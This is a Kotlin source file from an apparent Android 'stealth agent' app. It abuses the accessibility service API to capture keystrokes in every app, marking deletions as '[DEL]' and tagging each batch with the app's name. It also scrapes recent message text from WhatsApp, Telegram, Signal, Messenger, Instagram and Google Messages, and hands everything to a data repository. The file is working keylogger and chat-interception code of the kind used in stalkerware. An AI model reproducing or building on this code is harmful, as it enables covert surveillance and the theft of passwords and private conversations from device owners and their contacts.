package com.stealthagent.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.stealthagent.data.AgentRepository
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import javax.inject.Inject

@AndroidEntryPoint
class AgentAccessibilityService : AccessibilityService() {

    @Inject lateinit var repository: AgentRepository
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val keystrokeBuffer = StringBuilder()
    private var keystrokeApp = ""
    private var lastTextValue = ""
    private var flushJob: Job? = null

    private val chatApps = setOf(
        "com.whatsapp", "org.telegram.messenger", "org.thoughtcrime.securesms",
        "com.facebook.orca", "com.instagram.android", "com.google.android.apps.messaging",
    )

    override fun onServiceConnected() {
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            notificationTimeout = 100
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: return

        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            handleKeystroke(event, pkg)
            return
        }

        if (pkg !in chatApps) return
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val source = event.source ?: return
            val texts = extractText(source, 0)
            source.recycle()
            if (texts.isEmpty()) return

            scope.launch {
                runCatching {
                    val appName = runCatching { packageManager.getApplicationLabel(packageManager.getApplicationInfo(pkg, 0)).toString() }.getOrNull()
                    repository.recordEvent("CHAT_MESSAGE", Json.encodeToString(mapOf(
                        "packageName" to pkg, "appName" to (appName ?: ""),
                        "messages" to texts.takeLast(5).joinToString("\n"),
                    )))
                }
            }
        }
    }

    private fun handleKeystroke(event: AccessibilityEvent, pkg: String) {
        val newText = event.text?.joinToString("") ?: return
        if (newText == lastTextValue) return

        if (pkg != keystrokeApp) {
            flushKeystrokes()
            keystrokeApp = pkg
        }

        val diff = if (newText.length > lastTextValue.length && newText.startsWith(lastTextValue)) {
            newText.substring(lastTextValue.length)
        } else if (newText.length < lastTextValue.length) "[DEL]" else newText

        lastTextValue = newText
        keystrokeBuffer.append(diff)

        flushJob?.cancel()
        flushJob = scope.launch {
            delay(2000)
            flushKeystrokes()
        }
    }

    private fun flushKeystrokes() {
        val text = keystrokeBuffer.toString()
        if (text.isBlank()) return
        keystrokeBuffer.clear()
        val app = keystrokeApp
        scope.launch {
            runCatching {
                val appName = runCatching { packageManager.getApplicationLabel(packageManager.getApplicationInfo(app, 0)).toString() }.getOrNull()
                repository.recordEvent("KEYSTROKE", Json.encodeToString(mapOf(
                    "packageName" to app, "appName" to (appName ?: ""), "text" to text,
                )))
            }
        }
    }

    private fun extractText(node: AccessibilityNodeInfo, depth: Int): List<String> {
        if (depth > 8) return emptyList()
        val texts = mutableListOf<String>()
        node.text?.toString()?.takeIf { it.isNotBlank() && it.length > 1 }?.let { texts.add(it) }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            texts.addAll(extractText(child, depth + 1))
            child.recycle()
        }
        return texts.distinct()
    }

    override fun onInterrupt() {}
}
